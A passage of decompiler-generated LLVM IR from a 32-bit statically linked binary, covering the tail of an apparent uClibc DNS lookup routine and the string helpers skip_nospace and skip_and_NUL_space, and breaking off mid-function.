  store i32 %v5_804df2e, i32* %v3_804df31, align 4
  %v4_804df32 = call i32 @memcpy(i8* %v3_804da80, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804df32, i32* %eax.global-to-local, align 4
  %v0_804df37 = load i32, i32* @esp, align 4
  %v1_804df37 = add i32 %v0_804df37, 524
  %v2_804df37 = inttoptr i32 %v1_804df37 to i32*
  %v3_804df37 = load i32, i32* %v2_804df37, align 4
  store i32 %v3_804df37, i32* @eax, align 4
  %v1_804df3e = add i32 %v3_804df37, 36
  %v2_804df3e = inttoptr i32 %v1_804df3e to i32*
  %v3_804df3e = load i32, i32* %v2_804df3e, align 4
  %v4_804df3e = add i32 %v3_804df3e, 1
  store i32 %v4_804df3e, i32* %v2_804df3e, align 4
  %v0_804df41 = load i32, i32* @esp, align 4
  %v1_804df41 = add i32 %v0_804df41, 12
  br label %dec_label_pc_804df44

dec_label_pc_804df44:                             ; preds = %dec_label_pc_804dee1, %dec_label_pc_804de98, %dec_label_pc_804ded3, %dec_label_pc_804df1b
  %v21_804df44 = phi i32 [ %v3_804deed, %dec_label_pc_804dee1 ], [ %v1_804de9d, %dec_label_pc_804de98 ], [ %v0_804df44.pre, %dec_label_pc_804ded3 ], [ %v1_804df41, %dec_label_pc_804df1b ]
  %v1_804df44 = add i32 %v21_804df44, 60
  %v2_804df44 = inttoptr i32 %v1_804df44 to i32*
  %v3_804df44 = load i32, i32* %v2_804df44, align 4
  %v4_804df44 = load i32, i32* @ebx, align 4
  %v5_804df44 = add i32 %v4_804df44, %v3_804df44
  store i32 %v5_804df44, i32* %v2_804df44, align 4
  %v0_804df48 = load i32, i32* @esp, align 4
  %v1_804df48 = add i32 %v0_804df48, 68
  %v2_804df48 = inttoptr i32 %v1_804df48 to i32*
  %v3_804df48 = load i32, i32* %v2_804df48, align 4
  %v4_804df48 = add i32 %v3_804df48, 1
  store i32 %v4_804df48, i32* %v2_804df48, align 4
  %v0_804df4c = load i32, i32* @esp, align 4
  %v1_804df4c = add i32 %v0_804df4c, 68
  %v2_804df4c = inttoptr i32 %v1_804df4c to i32*
  %v3_804df4c = load i32, i32* %v2_804df4c, align 4
  store i32 %v3_804df4c, i32* %edx.global-to-local, align 4
  %v2_804df50 = add i32 %v0_804df4c, 364
  %v3_804df50 = inttoptr i32 %v2_804df50 to i32*
  %v4_804df50 = load i32, i32* %v3_804df50, align 4
  %v5_804df50 = sub i32 %v3_804df4c, %v4_804df50
  %v11_804df50 = xor i32 %v4_804df50, %v3_804df4c
  %v12_804df50 = xor i32 %v5_804df50, %v3_804df4c
  %v13_804df50 = and i32 %v12_804df50, %v11_804df50
  %v14_804df50 = icmp slt i32 %v13_804df50, 0
  %v16_804df50 = icmp slt i32 %v5_804df50, 0
  %v2_804df57 = icmp eq i1 %v16_804df50, %v14_804df50
  br i1 %v2_804df57, label %dec_label_pc_804df5d, label %dec_label_pc_804dd27

dec_label_pc_804df5d:                             ; preds = %dec_label_pc_804de13, %dec_label_pc_804dd0b, %dec_label_pc_804de76, %dec_label_pc_804de8a, %dec_label_pc_804df44, %dec_label_pc_804deaa.dec_label_pc_804df5d.loopexit_crit_edge
  %v0_804df5d = phi i32 [ %v0_804df5d.pre.pre, %dec_label_pc_804deaa.dec_label_pc_804df5d.loopexit_crit_edge ], [ %v0_804df4c86, %dec_label_pc_804dd0b ], [ %v0_804de67, %dec_label_pc_804de76 ], [ %v0_804de67, %dec_label_pc_804de8a ], [ %v0_804df4c, %dec_label_pc_804df44 ], [ %v0_804de13, %dec_label_pc_804de13 ]
  %v1_804df5d = add i32 %v0_804df5d, 28
  %v2_804df5d = inttoptr i32 %v1_804df5d to i32*
  %v3_804df5d = load i32, i32* %v2_804df5d, align 4
  %v5_804df5d = add i32 %v0_804df5d, -4
  %v6_804df5d = inttoptr i32 %v5_804df5d to i32*
  store i32 %v3_804df5d, i32* %v6_804df5d, align 4
  %v1_804df61 = call i32 @__GI_close(i32 %v3_804d997)
  store i32 %v1_804df61, i32* %eax.global-to-local, align 4
  %v0_804df66 = load i32, i32* @esp, align 4
  %v1_804df66 = inttoptr i32 %v0_804df66 to i32*
  %v2_804df66 = load i32, i32* %v1_804df66, align 4
  store i32 %v2_804df66, i32* @edi, align 4
  %v1_804df67 = add i32 %v0_804df66, 512
  %v2_804df67 = inttoptr i32 %v1_804df67 to i32*
  %v3_804df67 = load i32, i32* %v2_804df67, align 4
  %v4_804df67 = icmp eq i32 %v3_804df67, 0
  br i1 %v4_804df67, label %dec_label_pc_804df7c, label %dec_label_pc_804df71

dec_label_pc_804df71:                             ; preds = %dec_label_pc_804df5d
  store i32 %v3_804df67, i32* %ecx.global-to-local, align 4
  %v3_804df78 = inttoptr i32 %v3_804df67 to i32*
  store i32 %v1_804d8f6, i32* %v3_804df78, align 4
  %v0_804df83.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804df83

dec_label_pc_804df7c:                             ; preds = %dec_label_pc_804df5d
  store i32 %v1_804d8f6, i32* %v1_804df66, align 4
  %v1_804df7d = call i32 @free(i32 %v3_804d997)
  store i32 %v1_804df7d, i32* %eax.global-to-local, align 4
  %v0_804df82 = load i32, i32* @esp, align 4
  %v1_804df82 = inttoptr i32 %v0_804df82 to i32*
  %v2_804df82 = load i32, i32* %v1_804df82, align 4
  store i32 %v2_804df82, i32* @esi, align 4
  %v3_804df82 = add i32 %v0_804df82, 4
  br label %dec_label_pc_804df83

dec_label_pc_804df83:                             ; preds = %dec_label_pc_804df71, %dec_label_pc_804df7c
  %v0_804df83 = phi i32 [ %v0_804df83.pre, %dec_label_pc_804df71 ], [ %v3_804df82, %dec_label_pc_804df7c ]
  %v1_804df83 = add i32 %v0_804df83, 44
  %v2_804df83 = inttoptr i32 %v1_804df83 to i32*
  %v3_804df83 = load i32, i32* %v2_804df83, align 4
  %v5_804df83 = add i32 %v0_804df83, -4
  %v6_804df83 = inttoptr i32 %v5_804df83 to i32*
  store i32 %v3_804df83, i32* %v6_804df83, align 4
  %v1_804df87 = call i32 @free(i32 %v3_804d997)
  store i32 %v1_804df87, i32* %eax.global-to-local, align 4
  %v0_804df8c = load i32, i32* @esp, align 4
  %v3_804df8c = add i32 %v0_804df8c, 4
  br label %dec_label_pc_804dfe8

dec_label_pc_804df8f:                             ; preds = %dec_label_pc_804dbfc, %dec_label_pc_804dbeb, %dec_label_pc_804dba5, %dec_label_pc_804dce9, %dec_label_pc_804dce0, %dec_label_pc_804dc94, %dec_label_pc_804dca0, %dec_label_pc_804dcd4, %dec_label_pc_804de13, %dec_label_pc_804de08, %dec_label_pc_804dc60, %dec_label_pc_804db59, %dec_label_pc_804db38, %dec_label_pc_804df11
  %v17_804df8f = phi i32 [ %v0_804de13, %dec_label_pc_804de13 ], [ %v0_804de13, %dec_label_pc_804de08 ], [ %v3_804dc0e, %dec_label_pc_804dc60 ], [ %v1_804db6c, %dec_label_pc_804db59 ], [ %v1_804db4e, %dec_label_pc_804db38 ], [ %v3_804df18, %dec_label_pc_804df11 ], [ %v0_804dcfe83, %dec_label_pc_804dcd4 ], [ %v0_804dcfe83, %dec_label_pc_804dca0 ], [ %v0_804dcfe83, %dec_label_pc_804dc94 ], [ %v0_804dcfe83, %dec_label_pc_804dce0 ], [ %v0_804dcfe83, %dec_label_pc_804dce9 ], [ %v0_804dbf1, %dec_label_pc_804dbfc ], [ %v0_804dbf1, %dec_label_pc_804dbeb ], [ %v1_804dbc3, %dec_label_pc_804dba5 ]
  %v1_804df8f = add i32 %v17_804df8f, 52
  %v2_804df8f = inttoptr i32 %v1_804df8f to i32*
  %v3_804df8f = load i32, i32* %v2_804df8f, align 4
  %v4_804df8f = add i32 %v3_804df8f, 1
  store i32 %v4_804df8f, i32* %v2_804df8f, align 4
  %v0_804df93 = load i32, i32* @esp, align 4
  %v1_804df93 = add i32 %v0_804df93, 48
  %v2_804df93 = inttoptr i32 %v1_804df93 to i32*
  store i32 -1, i32* %v2_804df93, align 4
  br label %dec_label_pc_804df9b

dec_label_pc_804df9b:                             ; preds = %dec_label_pc_804dc47, %dec_label_pc_804df8f
  %v0_804df9b = load i32, i32* @esp, align 4
  %v1_804df9b = add i32 %v0_804df9b, 40
  %v2_804df9b = inttoptr i32 %v1_804df9b to i32*
  %v3_804df9b = load i32, i32* %v2_804df9b, align 4
  %v4_804df9b = add i32 %v3_804df9b, -1
  store i32 %v4_804df9b, i32* %v2_804df9b, align 4
  %v0_804df9f = load i32, i32* @esp, align 4
  %v1_804df9f = add i32 %v0_804df9f, 40
  %v2_804df9f = inttoptr i32 %v1_804df9f to i32*
  %v3_804df9f = load i32, i32* %v2_804df9f, align 4
  %tmp51 = icmp slt i32 %v3_804df9f, 1
  br i1 %tmp51, label %dec_label_pc_804dfb3, label %dec_label_pc_804d99f

dec_label_pc_804dfab:                             ; preds = %dec_label_pc_804daed, %dec_label_pc_804da3b, %dec_label_pc_804d949, %dec_label_pc_804d941, %dec_label_pc_804d925
  %v0_804dfab = phi i32 [ %v12_804d8e4, %dec_label_pc_804d925 ], [ %v12_804d8e4, %dec_label_pc_804d941 ], [ %v12_804d8e4, %dec_label_pc_804d949 ], [ %v1_804db2d, %dec_label_pc_804daed ], [ %v1_804dae2, %dec_label_pc_804da3b ]
  %stack_var_-488.0 = phi i32 [ %tmp, %dec_label_pc_804d925 ], [ %tmp, %dec_label_pc_804d941 ], [ %tmp, %dec_label_pc_804d949 ], [ %v3_804d997, %dec_label_pc_804daed ], [ %v3_804d997, %dec_label_pc_804da3b ]
  %v1_804dfab = add i32 %v0_804dfab, 28
  %v2_804dfab = inttoptr i32 %v1_804dfab to i32*
  store i32 -1, i32* %v2_804dfab, align 4
  br label %dec_label_pc_804dfb3

dec_label_pc_804dfb3:                             ; preds = %dec_label_pc_804df9b, %entry, %dec_label_pc_804dfab
  %stack_var_-488.1 = phi i32 [ %stack_var_-488.0, %dec_label_pc_804dfab ], [ %tmp, %entry ], [ %v3_804d997, %dec_label_pc_804df9b ]
  %v0_804dfb3 = call i32 @__GI___h_errno_location()
  store i32 %v0_804dfb3, i32* %eax.global-to-local, align 4
  %v1_804dfb8 = inttoptr i32 %v0_804dfb3 to i32*
  store i32 -1, i32* %v1_804dfb8, align 4
  %v0_804dfbe = load i32, i32* @esp, align 4
  %v1_804dfbe = add i32 %v0_804dfbe, 28
  %v2_804dfbe = inttoptr i32 %v1_804dfbe to i32*
  %v3_804dfbe = load i32, i32* %v2_804dfbe, align 4
  %v13_804dfbe = icmp eq i32 %v3_804dfbe, -1
  br i1 %v13_804dfbe, label %dec_label_pc_804dfcf, label %dec_label_pc_804dfc5

dec_label_pc_804dfc5:                             ; preds = %dec_label_pc_804dfb3, %dec_label_pc_804dc84, %dec_label_pc_804dc50
  %stack_var_-488.2 = phi i32 [ %stack_var_-488.1, %dec_label_pc_804dfb3 ], [ %v3_804d997, %dec_label_pc_804dc50 ], [ %v3_804d997, %dec_label_pc_804dc84 ]
  %v0_804dfc5 = load i32, i32* @esp, align 4
  %v1_804dfc5 = add i32 %v0_804dfc5, 28
  %v2_804dfc5 = inttoptr i32 %v1_804dfc5 to i32*
  %v3_804dfc5 = load i32, i32* %v2_804dfc5, align 4
  %v5_804dfc5 = add i32 %v0_804dfc5, -4
  %v6_804dfc5 = inttoptr i32 %v5_804dfc5 to i32*
  store i32 %v3_804dfc5, i32* %v6_804dfc5, align 4
  %v1_804dfc9 = call i32 @__GI_close(i32 %stack_var_-488.2)
  store i32 %v1_804dfc9, i32* %eax.global-to-local, align 4
  %v0_804dfce = load i32, i32* @esp, align 4
  %v1_804dfce = inttoptr i32 %v0_804dfce to i32*
  %v2_804dfce = load i32, i32* %v1_804dfce, align 4
  store i32 %v2_804dfce, i32* %ecx.global-to-local, align 4
  %v3_804dfce = add i32 %v0_804dfce, 4
  br label %dec_label_pc_804dfcf

dec_label_pc_804dfcf:                             ; preds = %dec_label_pc_804dfb3, %dec_label_pc_804dfc5
  %v0_804dfcf = phi i32 [ %v0_804dfbe, %dec_label_pc_804dfb3 ], [ %v3_804dfce, %dec_label_pc_804dfc5 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.1, %dec_label_pc_804dfb3 ], [ %stack_var_-488.2, %dec_label_pc_804dfc5 ]
  %v1_804dfcf = add i32 %v0_804dfcf, 44
  %v2_804dfcf = inttoptr i32 %v1_804dfcf to i32*
  %v3_804dfcf = load i32, i32* %v2_804dfcf, align 4
  %v5_804dfcf = add i32 %v0_804dfcf, -4
  %v6_804dfcf = inttoptr i32 %v5_804dfcf to i32*
  store i32 %v3_804dfcf, i32* %v6_804dfcf, align 4
  %v1_804dfd3 = call i32 @free(i32 %stack_var_-488.3)
  store i32 %v1_804dfd3, i32* %eax.global-to-local, align 4
  %v2_804dfd8 = load i32, i32* @esp, align 4
  %v3_804dfd8 = add i32 %v2_804dfd8, -4
  %v4_804dfd8 = inttoptr i32 %v3_804dfd8 to i32*
  store i32 %v1_804d8f6, i32* %v4_804dfd8, align 4
  %v1_804dfd9 = call i32 @free(i32 %stack_var_-488.3)
  store i32 %v1_804dfd9, i32* %eax.global-to-local, align 4
  %v0_804dfde = load i32, i32* @esp, align 4
  %v1_804dfde = add i32 %v0_804dfde, 40
  %v2_804dfde = inttoptr i32 %v1_804dfde to i32*
  store i32 -1, i32* %v2_804dfde, align 4
  %v0_804dfe6 = load i32, i32* @esp, align 4
  %v1_804dfe6 = inttoptr i32 %v0_804dfe6 to i32*
  %v2_804dfe6 = load i32, i32* %v1_804dfe6, align 4
  store i32 %v2_804dfe6, i32* %eax.global-to-local, align 4
  %v3_804dfe6 = add i32 %v0_804dfe6, 4
  %v1_804dfe7 = inttoptr i32 %v3_804dfe6 to i32*
  %v2_804dfe7 = load i32, i32* %v1_804dfe7, align 4
  store i32 %v2_804dfe7, i32* %edx.global-to-local, align 4
  %v3_804dfe7 = add i32 %v0_804dfe6, 8
  br label %dec_label_pc_804dfe8

dec_label_pc_804dfe8:                             ; preds = %dec_label_pc_804df83, %dec_label_pc_804dfcf
  %storemerge = phi i32 [ %v3_804dfe7, %dec_label_pc_804dfcf ], [ %v3_804df8c, %dec_label_pc_804df83 ]
  %v1_804dfe8 = add i32 %storemerge, 32
  %v2_804dfe8 = inttoptr i32 %v1_804dfe8 to i32*
  %v3_804dfe8 = load i32, i32* %v2_804dfe8, align 4
  store i32 %v3_804dfe8, i32* %eax.global-to-local, align 4
  %v1_804dfec = add i32 %storemerge, 480
  %v1_804dff2 = inttoptr i32 %v1_804dfec to i32*
  %v2_804dff2 = load i32, i32* %v1_804dff2, align 4
  store i32 %v2_804dff2, i32* @ebx, align 4
  %v3_804dff2 = add i32 %storemerge, 484
  %v1_804dff3 = inttoptr i32 %v3_804dff2 to i32*
  %v2_804dff3 = load i32, i32* %v1_804dff3, align 4
  store i32 %v2_804dff3, i32* @esi, align 4
  %v3_804dff3 = add i32 %storemerge, 488
  %v1_804dff4 = inttoptr i32 %v3_804dff3 to i32*
  %v2_804dff4 = load i32, i32* %v1_804dff4, align 4
  store i32 %v2_804dff4, i32* @edi, align 4
  %v3_804dff4 = add i32 %storemerge, 492
  %v1_804dff5 = inttoptr i32 %v3_804dff4 to i32*
  %v2_804dff5 = load i32, i32* %v1_804dff5, align 4
  store i32 %v2_804dff5, i32* @ebp, align 4
  ret i32 %v3_804dfe8

; uselistorder directives
  uselistorder i32 %v0_804dfcf, { 1, 0 }
  uselistorder i32 %stack_var_-488.1, { 1, 0 }
  uselistorder i32 %v0_804df9f, { 1, 0 }
  uselistorder i32 %v0_804df83, { 1, 0 }
  uselistorder i32 %v3_804df67, { 1, 0, 2 }
  uselistorder i32 %v0_804df5d, { 1, 0 }
  uselistorder i32 %v5_804df50, { 1, 0 }
  uselistorder i32 %v0_804df4c, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804defe, { 1, 0, 2 }
  uselistorder i32* %v1_804deed, { 1, 0, 2 }
  uselistorder i32 %v1_804deae, { 1, 0 }
  uselistorder i32 %v1_804de9d, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_804de5e, { 1, 0 }
  uselistorder i32 %v2_804de5b, { 1, 0 }
  uselistorder i32 %v0_804de26, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v5_804ddfb, { 1, 0 }
  uselistorder i32 %v3_804ddfa, { 1, 0 }
  uselistorder i32 %v2_804ddda, { 1, 0 }
  uselistorder i32 %v2_804ddc6, { 1, 0 }
  uselistorder i32 %v2_804ddbd, { 1, 0 }
  uselistorder i32 %v2_804ddb4, { 1, 0 }
  uselistorder i32 %v2_804dd9d, { 1, 0 }
  uselistorder i32 %v2_804dd89, { 1, 0 }
  uselistorder i32 %v0_804dd66, { 1, 0, 2 }
  uselistorder i32 %v2_804dd57, { 2, 1, 0 }
  uselistorder i32 %v5_804dd02, { 1, 0 }
  uselistorder i32 %v3_804dcfe, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_804dcfe, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804dce0, { 1, 0 }
  uselistorder i32 %v0_804dce0, { 0, 2, 1 }
  uselistorder i32 %v1_804dcdb, { 1, 2, 0 }
  uselistorder i32 %v2_804dcd9, { 1, 2, 0 }
  uselistorder i32 %v2_804dcd4, { 1, 0 }
  uselistorder i32 %v3_804dcb2, { 4, 0, 2, 3, 1 }
  uselistorder i32 %v0_804dccc65, { 0, 2, 1 }
  uselistorder i32 %v0_804dcd766, { 0, 2, 1 }
  uselistorder i32 %v3_804dc98, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804dcfe83, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_804dc41, { 1, 0 }
  uselistorder i32 %v3_804dc41, { 2, 0, 1, 3 }
  uselistorder i32 %v3_804dc26, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804dc0e, { 0, 2, 1 }
  uselistorder i32 %v0_804dc0d, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v1_804dbe6, { 1, 0 }
  uselistorder i32 %v4_804dbda, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_804dbc3, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804dba5, { 1, 0 }
  uselistorder i32 %v0_804db6c, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804db4e, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804db2d, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804daa8, { 1, 0 }
  uselistorder i32 %v1_804da57, { 1, 0 }
  uselistorder i32 %v2_804da4c, { 1, 0 }
  uselistorder i32 %v0_804d9fc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804d9b0, { 3, 2, 1, 0 }
  uselistorder i32 %v3_804d99f, { 1, 0 }
  uselistorder i8* %v3_804da80, { 1, 2, 0 }
  uselistorder i32 %v3_804d997, { 10, 11, 2, 0, 1, 7, 8, 9, 4, 5, 6, 12, 13, 14, 15, 17, 3, 16, 18, 19 }
  uselistorder i32 %v3_804d8fe, { 4, 5, 6, 7, 8, 9, 10, 11, 3, 12, 2, 13, 1, 14, 17, 16, 15, 18, 0, 19 }
  uselistorder i32 %v1_804d8f6, { 11, 3, 4, 0, 5, 1, 6, 7, 8, 2, 9, 10, 12, 13, 14 }
  uselistorder i32* %edx.global-to-local, { 0, 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 29, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 72, { 7, 0, 2, 3, 6, 4, 5, 1, 8 }
  uselistorder i32 39, { 1, 2, 3, 4, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 344, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 2, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i16* @global_var_8053580.106, { 1, 0 }
  uselistorder i32 (i32)* @__GI_close, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32 130, { 1, 0 }
  uselistorder label %dec_label_pc_804dfe8, { 1, 0 }
  uselistorder label %dec_label_pc_804dfcf, { 1, 0 }
  uselistorder label %dec_label_pc_804dfb3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804df9b, { 1, 0 }
  uselistorder label %dec_label_pc_804df8f, { 13, 8, 9, 3, 4, 7, 6, 5, 10, 0, 1, 2, 11, 12 }
  uselistorder label %dec_label_pc_804df83, { 1, 0 }
  uselistorder label %dec_label_pc_804df5d, { 4, 5, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804df44, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804de04, { 1, 0 }
  uselistorder label %dec_label_pc_804dd27, { 1, 0 }
  uselistorder label %dec_label_pc_804dce0, { 1, 0 }
  uselistorder label %dec_label_pc_804dcb2, { 1, 0 }
  uselistorder label %dec_label_pc_804dc94, { 1, 0 }
  uselistorder label %dec_label_pc_804da3b, { 1, 0 }
  uselistorder label %dec_label_pc_804da0e, { 1, 0 }
  uselistorder label %dec_label_pc_804d9b0, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dff8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dff8, i32* %stack_var_-4, align 4
  %v0_804dff9 = load i32, i32* @eax, align 4
  %v4_804e008.pre = load i32, i32* @ecx, align 4
  store i32 %v0_804dff9, i32* %ebx.global-to-local, align 4
  %v1_804e0087 = inttoptr i32 %v0_804dff9 to i8*
  %v2_804e0088 = load i8, i8* %v1_804e0087, align 1
  %v3_804e0089 = zext i8 %v2_804e0088 to i32
  %v5_804e00810 = and i32 %v4_804e008.pre, -256
  %v6_804e00811 = or i32 %v3_804e0089, %v5_804e00810
  store i32 %v6_804e00811, i32* @ecx, align 4
  %v4_804e00a12 = icmp eq i8 %v2_804e0088, 0
  br i1 %v4_804e00a12, label %dec_label_pc_804e01c, label %dec_label_pc_804e00e.lr.ph

dec_label_pc_804e00e.lr.ph:                       ; preds = %entry
  %v0_804e011.pre = load i32, i32* @global_var_8053338, align 8
  br label %dec_label_pc_804e00e

dec_label_pc_804dffd:                             ; preds = %dec_label_pc_804e00e
  %v10_804dffd = icmp eq i8 %v2_804e00815, 10
  %v1_804e000 = icmp eq i1 %v10_804dffd, false
  br i1 %v1_804e000, label %dec_label_pc_804e007, label %dec_label_pc_804e002

dec_label_pc_804e002:                             ; preds = %dec_label_pc_804dffd
  store i8 0, i8* %v1_804e00814, align 1
  %v0_804e01c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e01e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804e01c

dec_label_pc_804e007:                             ; preds = %dec_label_pc_804dffd
  %v1_804e007 = add i32 %v0_804e00713, 1
  store i32 %v1_804e007, i32* %ebx.global-to-local, align 4
  %v1_804e008 = inttoptr i32 %v1_804e007 to i8*
  %v2_804e008 = load i8, i8* %v1_804e008, align 1
  %v3_804e008 = zext i8 %v2_804e008 to i32
  %v5_804e008 = and i32 %v6_804e00817, -256
  %v6_804e008 = or i32 %v3_804e008, %v5_804e008
  store i32 %v6_804e008, i32* @ecx, align 4
  %v4_804e00a = icmp eq i8 %v2_804e008, 0
  br i1 %v4_804e00a, label %dec_label_pc_804e01c, label %dec_label_pc_804e00e

dec_label_pc_804e00e:                             ; preds = %dec_label_pc_804e00e.lr.ph, %dec_label_pc_804e007
  %v6_804e00817 = phi i32 [ %v6_804e00811, %dec_label_pc_804e00e.lr.ph ], [ %v6_804e008, %dec_label_pc_804e007 ]
  %v3_804e00816 = phi i32 [ %v3_804e0089, %dec_label_pc_804e00e.lr.ph ], [ %v3_804e008, %dec_label_pc_804e007 ]
  %v2_804e00815 = phi i8 [ %v2_804e0088, %dec_label_pc_804e00e.lr.ph ], [ %v2_804e008, %dec_label_pc_804e007 ]
  %v1_804e00814 = phi i8* [ %v1_804e0087, %dec_label_pc_804e00e.lr.ph ], [ %v1_804e008, %dec_label_pc_804e007 ]
  %v0_804e00713 = phi i32 [ %v0_804dff9, %dec_label_pc_804e00e.lr.ph ], [ %v1_804e007, %dec_label_pc_804e007 ]
  %v2_804e016 = mul nuw nsw i32 %v3_804e00816, 2
  %v3_804e016 = add i32 %v0_804e011.pre, %v2_804e016
  %v4_804e016 = inttoptr i32 %v3_804e016 to i8*
  %v5_804e016 = load i8, i8* %v4_804e016, align 1
  %v6_804e016 = and i8 %v5_804e016, 32
  %v7_804e016 = icmp eq i8 %v6_804e016, 0
  br i1 %v7_804e016, label %dec_label_pc_804dffd, label %dec_label_pc_804e01c

dec_label_pc_804e01c:                             ; preds = %entry, %dec_label_pc_804e007, %dec_label_pc_804e00e, %dec_label_pc_804e002
  %v2_804e01e = phi i32 [ %v2_804e01e.pre, %dec_label_pc_804e002 ], [ %v0_804dff8, %dec_label_pc_804e00e ], [ %v0_804dff8, %dec_label_pc_804e007 ], [ %v0_804dff8, %entry ]
  %v0_804e01c = phi i32 [ %v0_804e01c.pre, %dec_label_pc_804e002 ], [ %v0_804e00713, %dec_label_pc_804e00e ], [ %v1_804e007, %dec_label_pc_804e007 ], [ %v0_804dff9, %entry ]
  store i32 %v2_804e01e, i32* @ebx, align 4
  ret i32 %v0_804e01c

; uselistorder directives
  uselistorder i32 %v1_804e007, { 0, 3, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e01c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804e00e, { 1, 0 }
}

define i32 @skip_and_NUL_space() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e020 = load i32, i32* @ebx, align 4
  store i32 %v0_804e020, i32* %stack_var_-4, align 4
  %v0_804e021 = load i32, i32* @eax, align 4
  %v4_804e023.pre = load i32, i32* @ecx, align 4
  store i32 %v0_804e021, i32* %ebx.global-to-local, align 4
  %v1_804e0233 = inttoptr i32 %v0_804e021 to i8*
  %v2_804e0234 = load i8, i8* %v1_804e0233, align 1
  %v3_804e0235 = zext i8 %v2_804e0234 to i32
  %v5_804e0236 = and i32 %v4_804e023.pre, -256
  %v6_804e0237 = or i32 %v3_804e0235, %v5_804e0236
  store i32 %v6_804e0237, i32* @ecx, align 4
  %v4_804e0258 = icmp eq i8 %v2_804e0234, 0
  br i1 %v4_804e0258, label %dec_label_pc_804e047, label %dec_label_pc_804e029

dec_label_pc_804e029:                             ; preds = %entry, %dec_label_pc_804e044
  %v3_804e02310 = phi i32 [ %v3_804e023, %dec_label_pc_804e044 ], [ %v3_804e0235, %entry ]
  %v1_804e0239 = phi i8* [ %v1_804e023, %dec_label_pc_804e044 ], [ %v1_804e0233, %entry ]
  %v0_804e02c = load i32, i32* @global_var_8053338, align 8
  %v2_804e031 = mul nuw nsw i32 %v3_804e02310, 2
  %v3_804e031 = add i32 %v0_804e02c, %v2_804e031
  %v4_804e031 = inttoptr i32 %v3_804e031 to i8*
  %v5_804e031 = load i8, i8* %v4_804e031, align 1
  %v6_804e031 = and i8 %v5_804e031, 32
  %v7_804e031 = icmp eq i8 %v6_804e031, 0
  br i1 %v7_804e031, label %dec_label_pc_804e047, label %dec_label_pc_804e037

dec_label_pc_804e037:                             ; preds = %dec_label_pc_804e029
  store i8 0, i8* %v1_804e0239, align 1
  %v0_804e03a = load i32, i32* @ecx, align 4
  %v1_804e03a = trunc i32 %v0_804e03a to i8
  %v10_804e03a = icmp eq i8 %v1_804e03a, 10
  br i1 %v10_804e03a, label %dec_label_pc_804e047, label %dec_label_pc_804e03f

dec_label_pc_804e03f:                             ; preds = %dec_label_pc_804e037
  %v10_804e03f = icmp eq i8 %v1_804e03a, 35
  br i1 %v10_804e03f, label %dec_label_pc_804e047, label %dec_label_pc_804e044

dec_label_pc_804e044:                             ; preds = %dec_label_pc_804e03f
  %v0_804e044 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e044 = add i32 %v0_804e044, 1
  store i32 %v1_804e044, i32* %ebx.global-to-local, align 4
  %v1_804e023 = inttoptr i32 %v1_804e044 to i8*
  %v2_804e023 = load i8, i8* %v1_804e023, align 1
  %v3_804e023 = zext i8 %v2_804e023 to i32
  %v5_804e023 = and i32 %v0_804e03a, -256
  %v6_804e023 = or i32 %v3_804e023, %v5_804e023
  store i32 %v6_804e023, i32* @ecx, align 4
  %v4_804e025 = icmp eq i8 %v2_804e023, 0
